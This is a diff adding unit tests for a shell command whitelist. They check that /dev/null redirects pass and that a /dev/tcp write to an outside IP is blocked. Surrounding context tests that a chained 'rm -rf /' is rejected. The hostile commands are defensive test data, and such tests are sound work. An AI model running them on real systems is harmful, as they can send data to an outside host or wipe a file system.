@@ -28,6 +28,29 @@ def test_holix_in_default_whitelist():
     assert ok, reason
 
 
+def test_allows_dev_null_redirect() -> None:
+    blocked, why = command_whitelist.blocks_dangerous_patterns(
+        "curl -sS http://127.0.0.1:8000/ >/dev/null"
+    )
+    assert blocked is False, why
+    blocked2, why2 = command_whitelist.blocks_dangerous_patterns("true 2>/dev/null")
+    assert blocked2 is False, why2
+    blocked3, why3 = command_whitelist.blocks_dangerous_patterns(
+        "python -c 'print(1)' >/dev/null 2>&1"
+    )
+    assert blocked3 is False, why3
+    ok, reason = command_whitelist.is_command_allowed("curl -sS http://127.0.0.1:8000/ >/dev/null")
+    assert ok, reason
+
+
+def test_blocks_dev_tcp_redirect() -> None:
+    blocked, why = command_whitelist.blocks_dangerous_patterns(
+        "bash -c 'echo x >/dev/tcp/1.2.3.4/80'"
+    )
+    assert blocked is True
+    assert why
+
+
 def test_blocks_dangerous_shell_chaining() -> None:
     ok, reason = command_whitelist.is_command_allowed("ls; rm -rf /")
     assert ok is False
